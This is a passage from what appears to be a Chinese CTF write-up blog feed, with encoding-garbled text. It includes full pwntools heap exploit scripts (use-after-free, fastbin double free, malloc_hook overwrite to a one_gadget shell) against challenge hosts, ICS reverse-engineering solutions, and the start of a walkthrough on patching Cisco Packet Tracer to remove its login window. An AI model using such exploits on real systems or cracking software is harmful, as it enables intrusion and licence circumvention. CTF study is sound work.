in</h3><p>å…¥é—¨å †é¢˜ï¼Œå­˜åœ¨uafï¼Œè¿›è¡Œ<code>fastbin attcak</code>å³å¯ã€‚</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,name,mes):    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sla(&#39;mes&#39;,str(mes))def show():    sla(&#39;Your choice :&#39;,&#39;2&#39;)def free(idx):    sla(&#39;Your choice :&#39;,&#39;3&#39;)    sla(&#39;index:&#39;,str(idx))payload = &#39;a&#39; * 0x60mes = &#39;b&#39; * 23add(0x100,payload,mes)add(0x60,payload,mes)free(0)add(0x60,&#39; &#39;,mes)show()ru(&quot;Game[2]&#39;s name :&quot;)libc_base = uu64(r(6)) - 0x3c4b20info_addr(&#39;libc_base&#39;,libc_base)free(2)free(1)free(2)malloc_hook = libc_base + 0x3c4aedadd(0x60,p64(malloc_hook),p64(malloc_hook))add(0x60,p64(malloc_hook),p64(malloc_hook))add(0x60,p64(malloc_hook),p64(malloc_hook))one = 0x4527a + libc_basepayload = &#39;1&#39; * 11 + p64(0) + p64(one)add(0x60,payload,payload)itr()</code></pre><p>å…¶ä¸­å¯ä»¥ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿›è¡Œgetshellï¼Œä¹Ÿå¯ä»¥åŒæ—¶2æ¬¡freeåŒä¸€ä¸ªchunkï¼Œè§¦å‘æŠ¥é”™å‡½æ•°ï¼Œè€Œè°ƒç”¨æŠ¥é”™å‡½æ•°çš„æ—¶å€™åˆä¼šç”¨åˆ°<code>malloc_hook</code>ï¼Œä»è€Œgetshellã€‚</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><ul><li>åªæœ‰addå’ŒdelåŠŸèƒ½</li><li>å­˜åœ¨uaf</li><li>åªèƒ½ç”³è¯·&lt;0x70çš„å †å—</li></ul><h4 id="å‰ç½®æŠ€èƒ½"><a href="#å‰ç½®æŠ€èƒ½" class="headerlink" title="å‰ç½®æŠ€èƒ½"></a>å‰ç½®æŠ€èƒ½</h4><p>éœ€è¦åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘<code>malloc_consolidate</code>ï¼Œä½¿<strong>ç›¸é‚»fastbinå †å—</strong>è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>åˆ¤æ–­fastbinæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæœªåˆå§‹åŒ–ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–ç„¶åé€€å‡ºã€‚</li><li>æŒ‰ç…§fastbinç”±å°åˆ°å¤§çš„é¡ºåºï¼ˆ0x20 ,0x30 ,0x40è¿™ä¸ªé¡ºåºï¼‰åˆå¹¶chunkï¼Œæ¯ç§ç›¸åŒå¤§å°çš„fastbinä¸­chunkçš„å¤„ç†é¡ºåºæ˜¯ä»fastbin-&gt;fdå¼€å§‹å–ï¼Œä¸‹ä¸€ä¸ªå¤„ç†çš„æ˜¯p-&gt;fdï¼Œä¾æ¬¡ç±»æ¨ã€‚</li><li>é¦–å…ˆå°è¯•åˆå¹¶<code>pre_chunk</code>ã€‚</li><li>ç„¶åå°è¯•åˆå¹¶<code>next_chunk</code>ï¼šå¦‚æœ<code>next_chunk</code>æ˜¯<code>top_chunk</code>ï¼Œåˆ™ç›´æ¥åˆå¹¶åˆ°<code>top_chunk</code>ï¼Œç„¶åè¿›è¡Œç¬¬å…­æ­¥ï¼›å¦‚æœ<code>next_chunk</code>ä¸æ˜¯<code>top_chunk</code>ï¼Œå°è¯•åˆå¹¶ã€‚</li><li>å°†å¤„ç†å®Œçš„chunkæ’å…¥åˆ°unsorted binå¤´éƒ¨ã€‚</li><li>è·å–ä¸‹ä¸€ä¸ªç©ºé—²çš„fastbinï¼Œå›åˆ°ç¬¬äºŒæ­¥ï¼Œç›´åˆ°æ¸…ç©ºæ‰€æœ‰fastbinä¸­çš„chunkï¼Œç„¶åé€€å‡ºã€‚</li></ol><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ul><li>åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘<code>malloc_consolidate</code>ï¼Œä½¿<strong>ç›¸é‚»fastbinå †å—</strong>è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ï¼Œåœ¨å †ä¸Šç•™ä¸‹libcçš„ç›¸å…³åœ°å€</li><li>åˆ©ç”¨fastbin attack ï¼Œæ‰“<code>__IO_2_1_stdout</code>ï¼Œæ³„æ¼libc</li><li>åˆ©ç”¨fastbin attack ï¼Œæ‰“<code>malloc_hook</code></li></ul><p>éš¾ç‚¹åœ¨ç”³è¯·å †å—çš„æ•°é‡,é¢˜ç›®é™åˆ¶äº†19ä¸ªï¼Œæ˜¯åˆšåˆšå¤Ÿç”¨ã€‚</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,name,mes):    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&quot;game&#39;s name:&quot;,str(name))    sla(&#39;mes&#39;,str(mes))def free(idx):    sla(&#39;Your choice :&#39;,&#39;2&#39;)    sla(&#39;index:&#39;,str(idx))def leak_addr():    payload = &#39;a&#39; * 0x28    mes = &#39;2&#39; * 23    add(0x28,payload,mes) #0    add(0x28,payload,mes) #1    add(0x28,payload,mes) #2    free(0)    free(1)    free(2)    add(0x68,payload,mes) #3    add(0x68,payload,mes) #4    add(0x68,payload,mes) #5    add(0x68,payload,mes) #6    free(3)    free(4)    free(5)    # debug()    sla(&#39;Your choice :&#39;,&#39;2&#39;)    sl(&#39;1&#39;*0x500)    free(0)    free(1)    free(2)    add(0x68,p16(0xb5dd),&#39;1&#39;) #7    add(0x68,p16(0xb5dd),&#39;1&#39;) #8    free(6)    free(7)    free(6)    add(0x68,p8(0x90),&#39;1&#39;) #9    add(0x68,&#39;1&#39;,&#39;1&#39;) #10    add(0x68,&#39;1&#39;,&#39;1&#39;) #11    add(0x68,&#39;1&#39;,&#39;1&#39;) #12    payload = &#39;b&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,&#39;104&#39;) #13    sa(&#39;name&#39;,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;39.101.184.181&#39;,10000)        continueinfo_addr(&#39;leak&#39;,leak)libc_addr = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_addr)ru(&#39;age&#39;)sl(&#39;1&#39;)free(10)free(11)free(10)malloc_hook = 0x3c4aed + libc_addradd(0x68,p64(malloc_hook),&#39;1&#39;)add(0x68,&#39;1&#39;,&#39;1&#39;)add(0x68,&#39;1&#39;,&#39;1&#39;)one_rec = 0xf0364 + libc_addrpayload = &#39;1&#39; * (0x13-8) + p64(0)+ p64(one_rec)add(0x68,payload,&#39;1&#39;)free(6)free(6)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ç¾ŠåŸæ¯2020éƒ¨åˆ†wp&quot;&gt;&lt;a href=&quot;#ç¾ŠåŸæ¯2020éƒ¨åˆ†wp&quot; class=&quot;headerlink&quot; title=&quot;ç¾ŠåŸæ¯2020éƒ¨åˆ†wp&quot;&gt;&lt;/a&gt;ç¾ŠåŸæ¯2020éƒ¨åˆ†wp&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp</title>
    <link href="http://chumen77.xyz/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/12/2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp/</id>
    <published>2020-09-12T09:15:09.106Z</published>
    <updated>2020-09-17T09:36:44.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å·¥æ§wp"><a href="#å·¥æ§wp" class="headerlink" title="å·¥æ§wp"></a>å·¥æ§wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>å°±æ˜¯ä¸€ä¸ªç®—æ³•çš„é€†å‘ã€‚</p><pre><code class="python">#!/usr/bin/env python2.7import structimport base64cypher_text = &#39;HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw==&#39;iv = struct.unpack(&quot;I&quot;, &#39;x1a0&#39;)[0]def decode(cypher_text,iv):    cypher_text = base64.b64decode(cypher_text)    padding = 4 - len(cypher_text) % 4    if padding != 0:        cypher_text = cypher_text + &quot;\x00&quot; * padding    l = cypher_text    crypher = struct.unpack(&quot;I&quot;*(len(l)/4),l)    datas = []    datas += [ decrypto(crypher[0]) ^ iv ]    for i in range(1,len(crypher)):        datas += [decrypto(crypher[i]) ^ crypher[i-1]]    return datasdef decrypto(data):    return data ^ (data &gt;&gt; 16)datas = decode(cypher_text,iv)flag = &quot;&quot;for i in datas:    flag += struct.pack(&quot;I&quot;,i)print flag</code></pre><h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>è§£å‹ä»¥åæ˜¯ä¸€ä¸ªimgï¼Œä½†æ˜¯å‘ç°æ˜¯æŸåçš„ã€‚</p><pre><code class="bash">file ./ICS_9.img./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯ext4çš„æ–‡ä»¶ã€‚<br>ç„¶åå¯ä»¥ç”¨fsckä¿®å¤ä¸€ä¸‹ï¼š</p><pre><code class="bash"> fsck.ext4 ./ICS_9.imge2fsck 1.42.13 (17-May-2015)ext2fs_open2: The ext2 superblock is corruptfsck.ext4: Superblock invalid, trying backup blocks..../ICS_9.img was not cleanly unmounted, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationFree blocks count wrong for group #0 (6789, counted=488).Fix&lt;y&gt;? yesFree blocks count wrong for group #1 (2006, counted=228).Fix&lt;y&gt;? yesFree blocks count wrong (8795, counted=716).Fix&lt;y&gt;? yesFree inodes count wrong for group #0 (1269, counted=1262).Fix&lt;y&gt;? yesFree inodes count wrong (2549, counted=2542).Fix&lt;y&gt;? yes./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åè¿›è¡ŒæŒ‚è½½:</p><pre><code class="bash">mkdir tmp2sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre><pre><code class="bash"> binwalk fil.encScan Time:     2015-03-09 15:35:08Target File:   /tmp/wu/tmp/fil.encMD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4Signatures:    328DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12Ecat AE54[71A3j9[\22?/+u0</code></pre><p>Binwalk ä¸€ä¸‹ï¼Œå‘ç°encæ–‡ä»¶æ˜¯opensslåŠ å¯†çš„æ–‡ä»¶ï¼ŒAE5æ–‡ä»¶æ˜¯å…³äºåŠ å¯†ç®—æ³•å’Œå¯†é’¥ã€‚</p><p>ä½†æ˜¯å¹¶ä¸çŸ¥é“æ˜¯å“ªç§æ¨¡å¼çš„åŠ å¯†å’Œå¯†é’¥çš„é•¿åº¦çš„åŠ å¯†ï¼Œéœ€è¦å†™ä¸€ä¸ªè„šæœ¬æµ‹è¯•ã€‚<br>è¿™æ˜¯æ‰€æœ‰çš„å¯èƒ½ï¼š</p><pre><code class="bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192   </code></pre><pre><code class="bash">#!/bin/bash   KEY=`cat AE5`   AES=&quot;-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192&quot;   for mode in $AES   do        openssl enc -d -in fil.enc -out ./tmp3/fil&quot;$mode&quot;.dec -k $KEY $mode   done  </code></pre><pre><code class="bash">sudo chmod +x ./1.shsudo sh 1.sh</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p><h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>ç¨‹åºä¸Šæ¥å°±å‘Šè¯‰ä¸€ä¸‹flagçš„æ ¼å¼ï¼Œå…¶ä¸­å­—ç¬¦çš„å†…å®¹æ˜¯20ä½ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹èµ°ï¼Œä¹Ÿä¼šå‘ç°æœ‰20çš„ç›¸å…³åˆ¤æ–­ã€‚<br>å…¶ä¸Šæ–¹æœ‰ä¸ªå¤§å°åˆ¤æ–­å¤§äº10å°±é€€å‡ºäº†ï¼Œä½†æ˜¯flagæ˜¯20ä½çš„ï¼Œæ˜æ˜¾éœ€è¦patchä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå¾€ä¸‹åˆ†æï¼Œå‘ç°ä½ è¾“å…¥çš„ä¸œè¥¿ä¼šè·Ÿ12ä½çš„<code>nemo_pwned_n</code>è¿›è¡Œå…ˆæ¯”è¾ƒä¸€ä¸‹ï¼Œ<br>æ¥ç€:</p><pre><code class="bash"> if ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 )</code></pre><p>æ˜æ˜¾è¿™æ˜¯éƒ½éœ€è¦è¿›è¡Œæ»¡è¶³çš„ã€‚<br>ç„¶åæ±‚è§£ä¸€ä¸‹ï¼š</p><pre><code class="bash">In [6]: hex(926180401)Out[6]: &#39;0x37346431&#39; (v17)In [7]: hex(1915971957)Out[7]: &#39;0x72336975&#39;. (v18)</code></pre><p>è¿™æ ·å¤§æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯åˆ¤æ–­å­—ç¬¦çš„ï¼Œè½¬ç ä¸€ä¸‹ï¼š</p><p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>ä½†æ˜¯å› ä¸ºåœ¨å†…å­˜ä¸­ï¼Œå…¶æ˜¯å°ç«¯åºçš„ï¼Œéœ€è¦åè½¬ä¸€ä¸‹ã€‚<br>çŒœæµ‹flagå°±æ˜¯<code>nemo_pwned_n1d47ui3r</code>ã€‚å…¶é•¿åº¦æ­£å¥½å°±æ˜¯20ä½ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>ç»è¿‡éªŒè¯çš„ç¡®æ˜¯çš„ã€‚</p><h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>ååˆ†ç®€å•ï¼Œè‡ªå·±è¾“å…¥çš„ä¸œè¥¿å‡å»0x14ï¼Œå’Œ<code>10445678951</code>è¿›è¡Œä¸€ä¸ªä¸ªå­—èŠ‚çš„æ¯”è¾ƒï¼Œç›¸ç­‰å°±okã€‚</p><pre><code class="bash">key = &#39;10445678951&#39;key = [ord(c) for c in key]flag = &#39;&#39;for i in key :    flag += chr(i+0x14)print(flag)</code></pre><h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>å…ˆè„±å£³ï¼Œespå®šå¾‹è„±å£³ã€‚ä¹Ÿå¯ä»¥ç”¨ä¸‡èƒ½è„±å£³æœºè¿›è¡Œè„±ã€‚<br>ç”±äºç»™äº†æç¤ºï¼Œæ˜¯éœ€è¦æ‰¾ä¸€ä¸ªipã€‚å¾ˆç®€å•çš„æ€è·¯å°±æ˜¯ç›´æ¥æ‰¾å¯ç–‘ipã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p><p>x32dbgç›´æ¥æ–­åœ¨è¿™é‡Œï¼Œå‘ä¸‹è·Ÿã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>å‘ç°å¯ç–‘ipï¼Œæäº¤å°±å¯¹äº†ã€‚</p><h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>ç¨‹åºå°±æ˜¯å¾ˆç®€å•æ‰¾åˆ°æ³¨å†Œç ã€‚<br>é‚®ç®±å¯ä»¥ä¹±è¾“å…¥ï¼Œä½†æ˜¯è¦ä¿è¯<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œæœ‰å‡½æ•°è¿›è¡Œæ§åˆ¶åˆ¤æ–­ã€‚<br>å¦‚æœä¸å¯¹å°±ä¼šè¯´ï¼Œé‚®ç®±ä¸åˆæ³•ã€‚<br>æ¥ç€çœ‹æµç¨‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p><p>è¿™å—åœ¨åˆ¤æ–­ä¸€å †ä¸œè¥¿ï¼Œæ¨æµ‹å°±æ˜¯æ³¨å†Œç ã€‚<br>å¾€ä¸Šä¸€çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¡ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>æ˜æ˜¾æ˜¯idaæ— æ³•è¯†åˆ«ï¼Œå…¶æ˜¯è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªä¸ªè½¬å­—ç¬¦ä¸²ï¼Œä»¥v12-v27æ•´åˆä¸€ä¸‹,<code>BZ9dmq4c8g9G7bAY</code>å‡ºæ¥è¿™ä¸ªã€‚<br>å¹¶ä¸”å¯ä»¥çœ‹åˆ°åˆ¤æ–­å°±æ˜¯16ä½ã€‚<br>ç„¶åè¿›è¡Œè¾“å…¥åˆ¤æ–­:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>å°±å¾ˆç®€å•æˆåŠŸæ‹¿åˆ°ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å·¥æ§wp&quot;&gt;&lt;a href=&quot;#å·¥æ§wp&quot; class=&quot;headerlink&quot; title=&quot;å·¥æ§wp&quot;&gt;&lt;/a&gt;å·¥æ§wp&lt;/h1&gt;&lt;h2 id=&quot;ICS-8&quot;&gt;&lt;a href=&quot;#ICS-8&quot; class=&quot;headerlink&quot; title=&quot;ICS_8&quot;&gt;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="misc" scheme="http://chumen77.xyz/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£</title>
    <link href="http://chumen77.xyz/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <id>http://chumen77.xyz/2020/09/07/å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£/</id>
    <published>2020-09-07T09:11:40.744Z</published>
    <updated>2020-09-12T09:14:20.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£"><a href="#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£" class="headerlink" title="å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£"></a>å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸“ä¸šè¯¾å¼€è®¾äº†è·¯ç”±äº¤æ¢è¿™é—¨è¯¾ï¼Œå…¶ä¸­è¦ç»å¸¸ä½¿ç”¨packet tracerè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å†Œçš„è¯ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦ç­‰å¾…15sï¼Œå°±å°è¯•ç ´è§£ä¸€ä¸‹ã€‚</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><p>ç ´é™¤ç­‰å¾…çš„15sï¼Œæœ€å¥½ç›´æ¥å»é™¤æ‰ç™»é™†çª—å£ã€‚ä½†æ˜¯è€å¸ˆä¸Šè¯¾ç»™æˆ‘ä»¬æ¼”ç¤ºè¿‡ï¼Œæœ‰ä¸ªå¾çˆ±ç ´è§£çš„æ’ä»¶æ˜¯ç›´æ¥ç ´è§£æ‰ç™»é™†çª—å£çš„ï¼Œå°±ç›´æ¥å¥”ç€è¿™ä¸ªç›®æ ‡å»ã€‚</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ul><li>win7 æ¨¡æ‹Ÿå™¨</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="ç ´è§£è¿‡ç¨‹è®°å½•"><a href="#ç ´è§£è¿‡ç¨‹è®°å½•" class="headerlink" title="ç ´è§£è¿‡ç¨‹è®°å½•"></a>ç ´è§£è¿‡ç¨‹è®°å½•</h2><h3 id="å¯»æ‰¾çªç ´å£"><a href="#å¯»æ‰¾çªç ´å£" class="headerlink" title="å¯»æ‰¾çªç ´å£"></a>å¯»æ‰¾çªç ´å£</h3><p>ï¿¼åœ¨å¼¹å‡ºç™»é™†ç•Œé¢æ—¶ï¼Œæœ€ä¸Šæ–¹ä¼šæœ‰ <code>netacad.com Login</code>çš„å­—çœ¼ï¼Œå…ˆå°±é€‰æ‹©è¿™é‡Œä½œä¸ºå…³é”®å­—ç¬¦ä¸²ã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªexeçš„ç¨‹åºä¸‹æœç´¢å­—ç¬¦ä¸²ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>ç«¯å£å¯ç–‘å­—ç¬¦ä¸²å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç„¶åå¼€å§‹f9ä¸€ç›´è¿è¡Œï¼Œåœ¨è¿™ä¸ª<code>netacad.com Login</code>ï¼Œè¿è¡Œå…¶åçš„è½¯ä»¶ä¼šå‘ç°ï¼Œçš„ç¡®å¼€å¯äº†ç™»é™†çš„çª—å£ã€‚è¿™æ ·å°±å¯ä»¥ç¡®å®šï¼Œå…³é”®å¤„å°±åœ¨è¿™é‡Œã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ï¼Œä¸€äº›ç™»é™†å¤±è´¥çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±æ— ç–‘æ˜¯è¿™ä¸€å—çš„å‡½æ•°æ§åˆ¶ç€è¿™ä¸ªç™»é™†çª—å£ã€‚</p><p>å‘ä¸Šçœ‹å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å‡ ä¸ªå°è·³è½¬ï¼Œå’Œä¸€ä¸ªå¤§è·³è½¬ï¼Œç„¶åè¿½è¿‡å»å¯ä»¥å‘ç°ï¼Œæ˜¯å¯ä»¥ç»•è¿‡è¿™äº›å…³é”®å‡½æ•°çš„ã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œå°è¯•æ”¹æˆ<code>jmp</code> æ— æ¡ä»¶è·³è½¬ä¸€ä¸‹è¯•ä¸€è¯•ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" 